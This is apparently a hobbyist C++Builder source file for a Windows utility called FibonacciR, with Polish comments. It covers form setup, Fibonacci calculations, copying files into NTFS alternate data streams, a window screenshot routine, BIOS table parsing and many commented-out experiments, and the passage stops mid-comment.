#include <vcl.h>
#pragma hdrstop

#include "Unit1.h"
#include "Point/FuncPoint.h"
#include <math.h>


// ---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma link "cgauges"
#pragma link "trayicon"
#pragma link "cspin"
#pragma resource "*.dfm"
TFibonacciR *FibonacciR;
using namespace std;

HHOOK g_hLogHook       = NULL;               // na klasê w¹tku
HWND g_hLastFocus      = NULL;
const int KeyPressMask = 0x80000000;
char g_PrvChar;

extern long long size_files; // Button SzukajOnClick()

//TRegistryIniFile  TClientWinSocket
//
//typedef struct{
//
// unsigned long     cbStruct;
// PWChar     pszTitle;
// PWChar     pszText;
// int         ttiIcon;
//   } tagEDITBALLOONTIP;
//  tagEDITBALLOONTIP *EDITHINT;
//
// void __fastcall ShowBalloonTip(TWinControl *Control,int  Icon,char *Title,wchar_t *Text,TColor BackCL,TColor TextCL)
//{
//	HWND hWndTip;
//	TOOLINFO ti;
//	HWND hWnd;
//
//	hWnd    = Control->Handle;
//	hWndTip = CreateWindow(TOOLTIPS_CLASS, NULL, WS_POPUP | TTS_NOPREFIX | TTS_BALLOON | TTS_ALWAYSTIP, 0, 0, 0, 0, hWnd, 0, HInstance, NULL);
//	if( hWndTip )
//	{
//		SetWindowPos(hWndTip, HWND_TOPMOST, 0, 0, 0, 0,
//		  SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
//		ti.cbSize = sizeof(ti);
//		ti.uFlags = TTF_CENTERTIP | TTF_TRANSPARENT | TTF_SUBCLASS;
//		ti.hwnd = hWnd;
//		ti.lpszText = Text;
//		GetClientRect(hWnd, &ti.rect);
//		SendMessage(hWndTip, TTM_SETTIPBKCOLOR, BackCL, 0);
//		SendMessage(hWndTip, TTM_SETTIPTEXTCOLOR, TextCL, 0);
//		SendMessage(hWndTip, TTM_ADDTOOL, 1, Integer(&ti));
//		SendMessage(hWndTip, TTM_SETTITLE, Icon % 4, Integer(Title));
//	}
//}
//---------------------------------------------------------------------------
__fastcall TFibonacciR::TFibonacciR(TComponent* Owner) : TForm(Owner) {

   //	ShowBalloonTip( Button9, 1, "ik1",L"Zobacz punkty", 0,0 );

//unique_ptr<TProgressBar> ProgressBar1(new TProgressBar(StatusBar1));   //shared_ptr
 ProgressBar1 = new TProgressBar(StatusBar1);
 ProgressBar1->Parent = StatusBar1;
 ProgressBar1->Position = 100;
 ProgressBar1->Height = StatusBar1->Height - 16;
 ProgressBar1->Top = 1;
 ProgressBar1->Width = StatusBar1->Width ;
 ProgressBar1->SmoothReverse = true;                                            // bufor (poprawia p³ynnoœæ)
 ProgressBar1->DoubleBuffered = true;
 ProgressBar1->Visible = True;
// StatusBar1->OnHint = ;

 ImageSave = new TImage(StatusBar1); 											// ikonka zapisu
 ImageSave->Parent = StatusBar1;
 ImageSave->Left = StatusBar1->Width -210;
 ImageSave->Top = 2;
 ImageSave->Proportional = true;
 ImageSave->Anchors = TAnchors() << akTop << akRight;

 timer = new TTimer(FibonacciR);
// timer->OnTimer = OnTimer(0);                                                 // b³¹d pamiêci w trybie Relase
 timer->Enabled;
 timer->Interval = 100;

 edit = new TEdit(StatusBar1);

 IconList = new TImageList(this);
 IconList->BkColor = clWhite;
 IconList->DrawingStyle = dsTransparent;
// IconList->ShareImages = true;
// IconList->SetSize( GetSystemMetrics(SM_CXICON), GetSystemMetrics(SM_CYICON) );  // zbyt du¿e
 IconList->SetSize( 16, 16 );


 IconMain32 = new TImageList(ImageList1);
 IconMain32->BkColor = clWhite;
 IconMain32->SetSize( 32,32 );
 IconMain32->OnChange = IconMain32Change( IconMain32 );
// IconMain32->ShareImages = true;
// IconMain32->DrawingStyle = dsTransparent;
	IconMain32->AddImage( ImageList1, 4);                                         //0
	IconMain32->AddImage( ImageList1, 5);                                         //1
	IconMain32->AddImage( ImageList1, 6);                                         //2
	IconMain32->AddImage( ImageList1, 10);                                        //3
	IconMain32->AddImage( ImageList1, 16);                                        //4 fajka powodzenia
	IconMain32->AddImage( ImageList1, 23);

 ListView1->SmallImages = IconList;

 S::iconlist_large = IconMain32;
 S::iconlist_small = IconList;
 for (int i = 0; i < sizeof(thWatek)/4; i++)
	thWatek[i] = NULL;

 P1 = NULL;     // Punkty wyznaczania
 P2 = NULL;

 P1 = new TWPoint(this);
 P2 = new TWPoint(this);

 Reg = new TRegistry();

 MPC_HC_Player_path = "";

	ResetIconList();
//ShowMessage( S::Image_reference_list_32->ComponentCount );

	ListView1->Column[1]->ImageIndex = 0;                                       // ³aduje ikony

	GdiPlus = new TGdiplus(0);


 KeyApp = this->WindowProc;
// this->WindowProc = GetKeyApp;

 tim = new TTimer(Timer1);
//  tim->OnTimer = OnTimer(0);
//  tim->Enabled;

 ButtonRepair->Hint = "Zeruje klucze : \n - NoDriveTypeAutoRun\n - NoControlPanel\n - DisableRegistryTools\n - NoDesktop\n - NoDispScrsavPage\n - NoViewOnDrive\nNoDriveTypeAutoRun = 181\nSHOWALL->CheckedValue = 1\nNOHIDDEN->CheckedValue = 2 ";


//	SHFILEINFO info;
//   DWORD ImageHandle = SHGetFileInfo(L"", 0, &info, sizeof(info),
//									 SHGFI_ICON | SHGFI_SHELLICONSIZE |
//									 SHGFI_SYSICONINDEX);
//   if (ImageHandle != 0)
//   {
//	  IconList->Handle = ImageHandle;
//	  IconList->ShareImages = true;
//   }

 DeleteMenu( GetSystemMenu(Handle, FALSE), SC_MAXIMIZE, MF_BYCOMMAND);          // usuwanie z menu opcji maksmalizacji

	 DragAcceptFiles(Handle, true); 											// akceptowanie upuszczanych plików
	 Df = WindowProc;
	 WindowProc = OnDropFiles;

	 FiFloat = new TFloatFI;
	 FiInt 	 = new TIntFI;

 Application->OnIdle = AppIdle;                                                 // bezczynnoœæ

	EditADSSave->OnRightButtonClick(Owner);

	S::T.reset(this);                                                           // ustawianie rodziców dla singletona

	S::ptr = this->StatusBar1;
	S::ptr->SetParentComponent( FibonacciR );

	Xmax = GetSystemMetrics( SM_CXVIRTUALSCREEN);
	Ymax = GetSystemMetrics( SM_CYVIRTUALSCREEN);

	CSpinButton1->Ctl3D = false;       											// nie dzia³a inaczej
	CSpinButton2->Ctl3D = false;
	CSpinButton3->Ctl3D = false;
	CSpinButton4->Ctl3D = false;
	CSpinButton5->Ctl3D = false;
	CSpinButton6->Ctl3D = false;
	CSpinButton7->Ctl3D = false;

#ifdef FINAL

//	TabSheet1->TabVisible = false;
//	TabSheet5->TabVisible = false;
	TabSheetInne->TabVisible = false;
//	CheckBoxClearP->Visible = false;
	ButtonRandom->Visible = false;

//	TabSheet2->TabVisible = false;
//	TabSheet6->TabVisible = false;

	PageControl2->ActivePageIndex = 1;
	Zawszenawierzchu1->Enabled = false;
	this->Caption = "FibonacciR " + ::GetFileVersion( ParamStr(0) );
	GroupBox5->Visible = false;
//	this->Height -= GroupBox5->Height;


#else

	FibonacciR->FormStyle = TFormStyle::fsNormal;
	S::Activated = true;

#endif


// ___________Ustawienia____przy____inicjalizacji____________________________

 w_default = 1;  	//wartoœæ zwracana w przypadku niepowodzenia np.litera w liczbie

// filter = "*.*";	// przy wyszukiwaniu plików

 FirmName = "Hera";     // nazwa firmy u¿ywana np. zapis do rejestru

 reg_save_data = false;		// zezwolenie na zapis danych do rejestru

}
//___________Deklaracje______________________________________________________

	TIntFI::fcn_ptr mtd = TIntFI::oblicz;                               // przypisane adresowi wskaŸnika *mtd metody oblicz();
	TFloatFI::fcn_ptr mtdp = TFloatFI::calculate;

//	TFloatFI::view_ptr view = TFloatFI::showRound;                                // domyœlne zaokr¹glanie w trybie zaawansowanym

// ---------------------------------------------------------------------------

 void __fastcall TFibonacciR::wej1Change(TObject *Sender) {

	 try {

		StatusInfo("");                                                         // czyszczenie komunikatów

		curpos = wej1->SelStart;                                               	// pozycja kursora

		(*FiInt.*mtd)();
		FiInt->toint();
		FiInt->wypisz();

//		 o1.toint();
//		 o1.wypisz();

		FibonacciR->wej->Perform(EM_SETSEL, curpos - 1, curpos - 1);
	 }

	 catch (Exception &exception) {
		 ShowError(exception.ToString(), &exception, Sender);
	 }

	 catch (...) {
		 ShowError("Wyj¹tek TFibonacciR::wej1Change()/nTo dziwne bo nie powinien mieæ miejsca",0, Sender);
	 }
 }
 // ---------------------------------------------------------------------------


 TNotifyEvent  TFibonacciR::IconMain32Change( TObject *Sender ) {

//	IconMain32->GetIcon( IconMain32->Count,  );
//IconList->get
if (Form2)                                                                      // zabezpieczenie pierwsze wywo³anie(konstruktor FibonacciR) TrackBarIconSize z Form2 jest przed stworzeniem okna Form2 (Fibonacci.cpp)
	IconList->SetSize( Form2->TrackBarIconSize->Position, Form2->TrackBarIconSize->Position );
	ResetIconList();
	IconList->Clear();
	IconList->AddImages( IconMain32 );
//	IconList->get
//	TImage i;
//	i.Picture->Icon->Handle =

 }

 void __fastcall TFibonacciR::wejChange(TObject *Sender) {

//	 StatusInfo("");
//
//	 try {
////	 TFloatFI o2;
//			addtoh(wej);                                                        // zapamamiêtywanie wyniku do przenoszenia przecinka w DigitalRewrite()
//			  (*FiFloat.*mtdp)();
////			(o2.*mtdp)();
//			FiFloat->Show();
////			o2.Show();
//
////			o2.bufor_do_obliczeñ;
//		}
//
//		catch (Exception &exception) {
//
//		LogSave("Wyj¹tek 'TFibonacciR::wejChange()' Exception: " + exception.ToString());
//
//	}
//	 catch(...){
//
//		wej->Text = DigitRewrite(wej->Text, 1, 1);
//
//		try {
//			 wej->Text.ToDouble();
//		} catch (...) {
//			ShowError("B³¹d 'TFibonacciR::wejChange()'");
//		}
//	}
}

//---------------------------------------------------------------------------
void __fastcall TFibonacciR::wey1KeyDown(TObject *Sender, WORD &Key,	TShiftState Shift) {

	if (Key == vkUp)		FibonacciR->FiFloat->incerment( (TEdit*) Sender );

	else if (Key == vkDown)	FibonacciR->FiFloat->decerment( (TEdit*) Sender );
}



 void __fastcall TFibonacciR::wy1KeyDown(TObject *Sender, WORD &Key,	TShiftState Shift) {



	if (Key == vkUp)		FibonacciR->FiFloat->incerment( (TEdit*) Sender );

	else if (Key == vkDown)	FibonacciR->FiFloat->decerment( (TEdit*) Sender );

//	else                   	FibonacciR->FiFloat->Key_Down( (TEdit*) Sender );
 }

// ---------------------------------------------------------------------------
void __fastcall TFibonacciR::CSpinButton2DownClick(TObject *Sender) {

	FibonacciR->FiFloat->decerment( (TCSpinButton*) Sender);
	if ( Form2->CheckBoxSave->Checked ) FiFloat->save();
}

// ---------------------------------------------------------------------------
void __fastcall TFibonacciR::CSpinButton2UpClick(TObject *Sender) {

	FiFloat->incerment( (TCSpinButton*) Sender);
	if ( Form2->CheckBoxSave->Checked ) FiFloat->save();
}

//---------------------------------------------------------------------------

bool __fastcall TFibonacciR::Kopiuj(String FileNameA, String Path, String FileNameB = "") {

	if ( Path[Path.Length()] == '\\' ) Path.Delete( Path.Length() , 1);         // usuwanie ostatniego backslasha
	if (FileNameB[1] == ':')
	FileNameB.Delete(1,1);


   if ( !FileExists(FileNameA,1)) {

	ProgressAnimation();
	ImageList1->GetIcon(4, ImageSave->Picture->Icon);                           // ikona powodzenia

	   if( ExistsDir( FileNameA ))

			StatusInfo("Foldery nie s¹ obs³ugiwane");
//			throw Exception("Foldery nie s¹ obs³ugiwane");

	   else StatusInfo("Plik nie istnieje");
//	   throw Exception("Plik nie istnieje");
   }

	if (Path == "0") 		Path = "";
	if (FileNameB == "0")	FileNameB = "";

	 while (FileExists(Path + ":" + FileNameB) ) {                    			// inkrementacja nazwy pliku

		FileNameB = IncremFileName(FileNameB);
	}

	 StatusInfo( Path + ":" + FileNameB);                             // œcie¿ka na statusBarze po inkrementacji
	 ImageSave->Hint = Path + ":" + FileNameB;

	try {

	   if( !CopyFile(FileNameA.c_str(), ( Path + ":" + FileNameB).c_str(), true))// w przypadku niepowozenia
		{
//              ShowMessage(GetLastError());
			ImageList1->GetIcon(5, ImageSave->Picture->Icon);                   // ikona niepowodzenia operacji
			StatusInfo(ErrorToText(GetLastError(), 1,1));                       // kod b³êdu
			ImageSave->Hint = ErrorToText(GetLastError(), 1,1);
			ListViewDrop->Selected->SubItemImages[0] = 5;

		}
		else
		{
			ImageList1->GetIcon(3, ImageSave->Picture->Icon);      	         // ikona powodzenia
			ListViewDrop->Selected->SubItemImages[0] = 4;
//			ListViewDrop->Items->Item->SubItems-> = 3;

		}
	}catch (Exception &exception)
	{
		ShowError("Wyj¹tek Kopiuj()", &exception);
	}
	 catch (...) {
		ShowError("B³¹d Kopiuj()");
	}

	if (CheckBoxSLOG->Checked) 	U::SaveLog(Path, FileNameB, FileNameA);

	return 1;
}
// ---------------------------------------------------------------------------
void __fastcall TFibonacciR::ListBox1DblClick(TObject *Sender) {

try{

	if ( ListBox1->ItemIndex >= 0 ) {

unique_ptr<String> Path_to_save(new String(ListBox1->Items->Strings[ListBox1->ItemIndex]));
unique_ptr<String> FileName(new String(Getname(ListBox1->Items->Strings[ListBox1->ItemIndex])));

		 *FileName 	 =   U::ApplyPref1( *FileName );
		 *Path_to_save = U::ApplyPref2( *Path_to_save );

	 Kopiuj((ListBox1->Items->Strings[ListBox1->ItemIndex]), 					// co
											 *Path_to_save,						// gdzie
												 *FileName); 					// nazwa
	 }
   }catch (Exception &exception) {

		ShowError("Wyj¹tek ListBox1DblClick()", &exception, Sender);
	}
   catch(...){
		ShowError("B³¹d ListBox1DblClick()",0,Sender);
   }
}
// ---------------------------------------------------------------------------
void __fastcall TFibonacciR::CheckBoxZapiszClick(TObject *Sender) {

	S::Save( CheckBoxZapiszF->Checked );

	if ( CheckBoxZapisz->Checked ) {

		mtd = TIntFI::zapisz;
//		mtdp = TFloatFI::save;
	}
	else {
		mtd = TIntFI::oblicz;
//		mtdp = TFloatFI::Show;
	}
}

// ---------------------------------------------------------------------------
void __fastcall TFibonacciR::FormKeyPress(TObject *Sender, System::WideChar &Key) {
		  /*         GetAsyncKeyState()!!!
 switch( Key )
	{
	case VK_RETURN:
		ShowMessage("You pressed Enter");
		break;
	case VK_F1:
		ShowMessage("Help is not available at the moment");
		break;
	case VK_DELETE:
		ShowMessage("Can't Delete This");
		break;
	case 'k':
		ShowMessage("Lowercase k was pressed");
		break;
	case 'K':
		ShowMessage("Uppercase K was pressed");
		break;
	case '$':
		ShowMessage("Show me the money");
		break;
	}
          */

		  ShowMessage(Key);
//if (GetKeyState(vkShift)== 0) {
//				   ShowMessage("vkShift");
//}
	if (GetKeyState(vkEscape)== 0) {
				   ShowMessage("vkEscape");
}

//	if (!Key) {
//		ShowMessage("Wciœniêto kombinacjê klawiszy Ctrl+C");
//	}
//	if (GetKeyState( vkControl)){
//		if (GetKeyState( vkC)){

//			ShowMessage("Wciœniêto kombinacjê klawiszy Ctrl+C");
//		}
//	}
	// if(Key == 'C' && Shift.Contains( ssCtrl ))
	// {
	// ShowMessage("Wciœniêto kombinacjê klawiszy Ctrl+C");
	// }
//	if (Shift.Contains(ssCtrl))
//	 {
//		if ((Key == 's') || (Key == 'S'))
//		{
//		  ShowMessage("Wciœniêto kombinacjê klawiszy s lub S");
//		}
//
//
//
//	 }
}

//---------------------------------------------------------------------------


int __fastcall Wyliczenia1(Pointer Parameter)
{
 for(int i = 0; i < 1000000; i++)
 {
//  FibonacciR->Edit1->Text = IntToStr(i);
  Sleep(100);
 }
 ExitThread(GetExitCodeThread(Wyliczenia1, NULL)); // usuniêcie w¹tku z pamiêci, od tego momentu w¹tku nie mo¿na ju¿ wstrzymaæ.
}
//--------------------------------
int __fastcall Wyliczenia2(Pointer Parameter)
{
 for(int i = 1000000; i > 0; i--)
 {
//  FibonacciR->Edit2->Text = IntToStr(i);
  Sleep(100);
 }
 ExitThread(GetExitCodeThread(Wyliczenia2, NULL)); // usuniêcie w¹tku z pamiêci, od tego momentu w¹tku nie mo¿na ju¿ wstrzymaæ.
}


//void BubbleSort(TListViev *Tabela, int Col)
//{
// AnsiString temp;
// for(int i = Tabela->FixedRows; i < Tabela->RowCount; i++)
// {
//  for(int j = Tabela->FixedRows; j < i; j++)
//  {
//   if(Tabela->Cells[Col][i] < Tabela->Cells[Col][j])
//   {
//    temp = Tabela->Rows[i]->GetText();
//    Tabela->Rows[i]->SetText(Tabela->Rows[j]->GetText());
//    Tabela->Rows[j]->SetText(temp.c_str());
//   }
//  }
// }
//}






/*The serial number is stored in the first block of the BIOS and as such
  should be accessable from address xF00000.
  I have even found information sugesting it is at address xFE0000. */

	typedef unsigned short ushort;
	typedef unsigned char uchar;
	ushort s;
				 typedef struct {
					 uchar Type;
					 uchar Length;
					 ushort Handle;
				 } HEADER;

				 ushort FindStructure(char *TableAddress,
					 ushort StructureCount, ushort Type) {
					 ushort i, handle;
					 uchar lasttype;
					 i = 0;
					 handle = 0xFFFF;
					 while (i < StructureCount && handle == 0xFFFF) {
						 i++;
						 lasttype = ((HEADER*)TableAddress)->Type;
						 if (lasttype == Type) {
							 handle = ((HEADER*)TableAddress)->Handle;
						 } /* Found first structure of the requested type */
						 else {
							 TableAddress += ((HEADER *)TableAddress)->Length;
							 while (*((int *)TableAddress) != 0) {
								 TableAddress++;
							 } /* Get past trailing string-list */
							 TableAddress += 2;
						 } /* Increment address to start of next structure */
					 } /* END while-loop looking for structure type */
					 return handle;
				 } /* END FindStructure */

	void screen( HWND okno, char * plik )
{
	HDC _dc = GetWindowDC( okno );
    RECT re;
    GetWindowRect( okno, & re );
    int w = re.right, h = re.bottom;
    HDC dc = CreateCompatibleDC( 0 );
    HBITMAP bm = CreateCompatibleBitmap( _dc, w, h );
    SelectObject( dc, bm );
    StretchBlt( dc, 0, 0, w, h, _dc, 0, 0, w, h, SRCCOPY );
	void * f = CreateFile( (wchar_t*)plik, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0 	);
	void * buf = new char[ w * h * 3 ];                                          // jeœli b³¹d tu to z³y uchwyt okna
    GetObject( bm, 84, buf );
	HDC ddd = GetDC( 0 );
    HDC dc2 = CreateCompatibleDC( ddd );
    tagBITMAPINFO bi;
	bi.bmiHeader.biSize = sizeof( bi.bmiHeader );
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 24;
	bi.bmiHeader.biCompression = 0;
	bi.bmiHeader.biSizeImage = w * h * 3;

	CreateDIBSection( dc, & bi, DIB_RGB_COLORS, & buf, 0, 0 );
	GetDIBits( dc, bm, 0, h, buf, & bi, DIB_RGB_COLORS );

	BITMAPFILEHEADER bif;
	bif.bfType = MAKEWORD( 'B', 'M' );
	bif.bfSize = w * h * 3 + 54;
	bif.bfOffBits = 54;
	bi.bmiHeader.biClrImportant = 0;
    bi.bmiHeader.biClrUsed = 0;
	bif.bfReserved1 = 0;
    bif.bfReserved2 = 0;
//	bif.biXPelsPerMeter = 0;
//	bif.biYPelsPerMeter = 0;

	BITMAPINFOHEADER bii;
	bii.biSize = 40;
	bii.biWidth = w;
	bii.biHeight = h;
	bii.biPlanes = 1;
	bii.biBitCount = 24;
	bii.biCompression = 0;
	bii.biSizeImage = w * h * 3;


	DWORD r;
	WriteFile( f, & bif, sizeof( bif ), & r, NULL );
	WriteFile( f, & bii, sizeof( bii ), & r, NULL );
	WriteFile( f, buf, w * h * 3, & r, NULL );
	CloseHandle( f );
}

// for(;;)
// {
//  FlashWindow(Application->Handle, true);
//  Sleep(300);
//  FlashWindow(Application->Handle, false);



void __fastcall TFibonacciR::Button2Click(TObject *Sender)
{          Times T(StatusBar1);    T.Start();

//	S::ptr = this->StatusBar1;
//
////	S::ptr->SetParentComponent( FibonacciR );
//		common::Win32Error e;

//ListViewDrop->Intems->Item[1]->s;
//ListViewDrop->Index->Item[i]->StateIndex = ListViewDrop->Index->Item[i]->StateIndex++;
//ListViewDrop->Items->Item[1]->SubItemImages[0] = 1;
//S::ptr->Visible = !S::ptr->Visible;
//
//		  ListView1->Column[1]->ImageIndex = 1;

//	   ShowMessage(  ::GetFileVersion(ParamStr(0))  ) ;

//			  StatusInfo(ParamStr(0));
				   ShowMessage( Getpath(ListView1->ItemFocused->Caption, 0) +
				ListView1->ItemFocused->SubItems->Strings[2]) ;


//   SendMail( ((AnsiString)"SMTP: herasa@op.pl").c_str(), ((AnsiString)"temat").c_str(), ((AnsiString)"tekst\n	ee").c_str(), 0 );

		 /*

String a = "C:\\zrzut.bmp";
//char[5]
//	  SendMail( ((AnsiString)"SMTP: herasa@op.pl").c_str(), ((AnsiString)"temat").c_str(), ((AnsiString)"tekst\n	ee").c_str(), 0 );

   char tabp[] = "C:\\zrzut.bmp";

		 OnSetFilesToClipboard( &a  ) ;
  ToArrW( &a );
//		 ShowMessage(srednia(6,2,3,4,5,0));
HDC hdc = GetDC( 0 );
for( int y = 0; y < 150; y++ )
for( int x = 0; x < 150; x++ )
if(( x - 75 ) *( x - 75 ) +( y - 75 ) *( y - 75 ) < 75 * 75 )
     SetPixel( hdc, x, y, RGB( x, 0, 200 - x ) );

	   ShowMessage(GetSystemMetrics( SM_DIGITIZER));

		 */

//			TCHAR buffer[256] = TEXT("");
//	TCHAR szDescription[8][32] = {TEXT("NetBIOS"),
//		TEXT("DNS hostname"),
//		TEXT("DNS domain"),
//		TEXT("DNS fully-qualified"),
//		TEXT("Physical NetBIOS"),
//		TEXT("Physical DNS hostname"),
//		TEXT("Physical DNS domain"),
//		TEXT("Physical DNS fully-qualified")};
//	int cnf = 0;
//
//	for (cnf = 0; cnf < ComputerNameMax; cnf++)
//	{
//		if (!GetComputerNameEx((COMPUTER_NAME_FORMAT)cnf, buffer, &dwSize))
//		{
//		ShowMessage(GetLastError()) ;
//			_tprintf(TEXT("GetComputerNameEx failed (%d)\n"), GetLastError());
//			return;
//		}
//		else _tprintf(TEXT("%s: %s\n"), szDescription[cnf], buffer);
//
//		ShowMessage( String(szDescription[cnf]) + buffer);
//
//		dwSize = sizeof(buffer);
//		ZeroMemory(buffer, dwSize);
//	}







//HKEY hKey;
// LONG Res1,Res2;
// DWORD cData = 255;
// TCHAR SystemBiosVersion[255] = {'\0'};
// Res1 = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", NULL, KEY_QUERY_VALUE, &hKey);
//
// if(Res1 == ERROR_SUCCESS)
// {
//  Res2 = RegQueryValueEx(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)SystemBiosVersion, &cData);
//  if(Res2 == ERROR_SUCCESS)
//  {
//   int i = 0;
//   while(i < cData)
//   {
//	if(SystemBiosVersion[i] == '\0') SystemBiosVersion[i] = '\r';
//	i++;
//   }
//   Memo1->Lines->SetText(SystemBiosVersion);
//  }
//  else
//  {
//   Application->MessageBox(L"RegQueryValueEx: SystemBiosVersion", L"ERROR", MB_OK | MB_ICONSTOP);
//  }
// }
// else
// {
//  Application->MessageBox(L"RegQueryValueEx: SystemBiosVersion", L"ERROR", MB_OK | MB_ICONSTOP);
// }
//
// RegCloseKey(hKey);

//	   TDateTime Dt;
//		Dt = FileDateToDateTime(0);
//
//   ShowMessage(Dt.TimeString());




			   ImageList1->Height = 18;
			   ImageList1->Width = ImageList1->Height;
					ImageList1->GetIcon(2, ImageSave->Picture->Icon ) ;


//					   MessageBeep(MB_ICONASTERISK);
//					   MessageBeep(MB_ICONHAND);
//						 MessageBeep(MB_ICONEXCLAMATION);
			   MessageBeep(MessageBeep(MB_OK));
//				Graphics::TBitmap *FormBitmap = new Graphics::TBitmap();
//
//   FormBitmap->Handle = CreateCompatibleBitmap(GetWindowDC(Handle), Width, Height);    BitBlt(FormBitmap->Canvas->Handle, 0, 0, FormBitmap->Width, FormBitmap->Height,           GetWindowDC(Handle), 0, 0, SRCCOPY);
//   FormBitmap->SaveToFile("c:\\canvas.bmp");
//
//   delete FormBitmap;

//Sleep(100);
//Integer L = ColorToRGB(clRed);
//TIniFile *ini = new TIniFile(ExtractFileDir(Application->ExeName) + "\\PlikIni.ini");
//ini->WriteInteger("COLOR", "kolor1", L);
//ini->Free();
//		TIniFile *ini = new TIniFile(ExtractFileDir(Application->ExeName) + "\\PlikIni.ini");
//Integer L = ini->ReadInteger("COLOR", "kolor1", 0);
//FibonacciR->Color = (TColor)L;
//ini->Free();

//						i++;
//						T.Stop();
//T.Show();
//	   AnsiString FileName = Memo1->Text;
// SelectDirectory("Wybierz katalog", "", FileName);

//GetAllFileVersionInformation<TMemo>( FileName.c_str(), Memo1)

		/*
   HWND BCBHandle = FindWindow(L"TAppBuilder", NULL);         // it works

   if (BCBHandle)
   {
	  HDC dc = GetWindowDC(BCBHandle);
	  Graphics::TCanvas *ScreenCanvas = new Graphics::TCanvas;
	  Graphics::TBitmap *BMP = new Graphics::TBitmap;
	  ScreenCanvas->Handle = dc;

	  TRect rect = ScreenCanvas->ClipRect;
	  rect.Right = rect.Right - rect.Left;
	  rect.Bottom = rect.Bottom - rect.Top;
	  rect.Top = 0; rect.Left = 0;

	  BMP->Width = rect.Right;
	  BMP->Height= rect.Bottom;
	  BMP->Canvas->CopyRect(rect, ScreenCanvas, ScreenCanvas->ClipRect);

	  BMP->SaveToFile("c:\\zrzut.bmp");

	  delete ScreenCanvas;
	  delete BMP;
	  ReleaseDC(BCBHandle, dc);
   }      */

//          HMENU hMenu = GetSystemMenu(Handle, FALSE);
//  setme DeleteMenu(hMenu, SC_CLOSE, MF_BYCOMMAND);
//
//				SC_MAXIMIZE
//HMENU hMenu = GetSystemMenu(Handle, 0);
//  DeleteMenu(hMenu, 61488, MF_BYCOMMAND);

// kolor html na rgb
//		 TColorRef rgbVal;
//
// if(ColorDialog1->Execute())
// {
//   rgbVal = ColorToRGB(ColorDialog1->Color);
//   AnsiString tmp = Format("%2x%2x%2x", OPENARRAY(TVarRec,
//						   (GetRValue(rgbVal), GetGValue(rgbVal), GetBValue(rgbVal))));
//   Label1->Caption = tmp;
//  }



//											HWND hwnd = this->Handle;
//LONG_PTR style = GetWindowLongPtr( hwnd, GWL_STYLE );
//style &= ~WS_SYSMENU; // unset the system menu flag
//SetWindowLongPtr( hwnd, i, style );
// force Windows to refresh some cached window styles
//SetWindowPos( hwnd, 0, 0, 0, 0, 0,
//SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED );

//	HMENU hMenu = GetSystemMenu(Handle, 1);
//	DeleteMenu(hMenu, GWL_EXSTYLE, MF_BYPOSITION );

//  HMENU hMenu = GetSystemMenu(Handle, false);
// DeleteMenu(hMenu, SC_RESTORE, MF_BYCOMMAND);
// DeleteMenu(hMenu, SC_MINIMIZE, MF_BYCOMMAND);
// DeleteMenu(hMenu, SC_MAXIMIZE, MF_BYCOMMAND);
//	DeleteMenu( GetSystemMenu(Handle, FALSE), SC_MAXIMIZE, MF_BYCOMMAND);


// DeleteMenu(hMenu, SC_CLOSE, MF_BYCOMMAND);	   //	ShowMessage((int)SC_MAXIMIZE);


//				  this->BorderIcons = 61488;


	char buff[512];
	char d= 0x0002;
	char MainBoardBiosDate[1000];
   strcpy_s(MainBoardBiosDate, 500,&d);
   Memo1->Text = (AnsiString)MainBoardBiosDate;
//   show_bios_information();
//			  Memo1->Text = WhatInClipboard();

//	HDROP   hDrop;
//	hDrop = (HDROP)wParam;
//	UINT nCnt  = DragQueryFile(hDrop, (UINT)-1, NULL, 0);
//	for(int nIndex = 0; nIndex < nCnt; ++nIndex) {
//		UINT nSize;
//		if(0 == (nSize = DragQueryFile(hDrop, nIndex, NULL, 0)))
//			continue;
//
//		TCHAR *pszFileName = new TCHAR[++nSize];
//		if(DragQueryFile(hDrop, nIndex, pszFileName, nSize)) {
//			 next file name is in 'pszFileName', use this
//		}
//		delete [] pszFileName;
//	}
//	DragFinish(hDrop);

//		  for (int i = 0; i < 10*9; i++) {
//
//		  ShellExecuteA(0,"",0,0,0,0);
//
//		  }
//
//
//			  Memo1->Text += String(buff);
//	SetClipboardData(
//   CF_DSPENHMETAFILE,
//  _In_opt_ HANDLE hMem
//);                 CF_DSPENHMETAFILE

//  timer->OnTimer = OnTimer(Sender);
//
//  timer->Enabled = true;

//	   ShowMessage(AnsiString::LoadStr(ID_MSG1));
			 if(g_hLogHook != NULL)
 {
  UnhookWindowsHookEx(g_hLogHook);
  g_hLogHook = NULL;
 }
//        sumuj(0);
//						mnozenie(1,2,3);
//				  String a; //=  ((AnsiString*)" MODEON") ;
//	  WinExec( ((AnsiString)"start C:\\Program Files (x86)\\Windows Photo Viewer\\PhotoViewer.dll C:\\Users\\Puler\\Desktop\\save31.psd:MÓJ074.bmp").c_str(),1);
//	  AnsiString b = "d";
//			   TrimT(&b);
//ShowMessage("\"" + *(&b) );
// ShowProperties( ListView1->ItemFocused->Caption +"\\"+ ListView1->ItemFocused->SubItems->Strings[0] );


//           Schowek.SetComponent(TComponent); - zapis
//
//  Schowek.GetComponent(Owner, Parent); - odczyt

//					ShowMessage(  Find( (String*)&a,b.c_str() ));

//ShowSplash(5000);
//	  Splash->shoGleam(1000);

 //dynamic_cast<TEdit *>(FindComponent("Edit2"))->Text =
//dynamic_cast<TEdit *>(FindComponent("Edit2"))->Text;

//	TImage *Image = new TImage (Application);
//Image->Parent = this;
//Image->Left =555;
//Image->Picture->LoadFromFile("C:\\Users\\Puler\\Desktop\\PW logo.png");


//					 screen( FindWindowA(0,"Fibonacci"),  "an.a"  );
//	char a = 0xFE0000;
//
//	HEADER struc;
//
//		ushort Handle = FindStructure(&a,0,0);
//
//			ShowMessage(struc.Handle);

//   LogSave( (AnsiString) Handle);


	/*
	//PVOID *pFirmwareTableBuffer;
  DWORD BufferSize;

	  struct RawSMBIOSData
{
	BYTE    Used20CallingMethod;
	BYTE    SMBIOSMajorVersion;
	BYTE    SMBIOSMinorVersion;
	BYTE    DmiRevision;
	DWORD    Length;
	BYTE    SMBIOSTableData[];
};

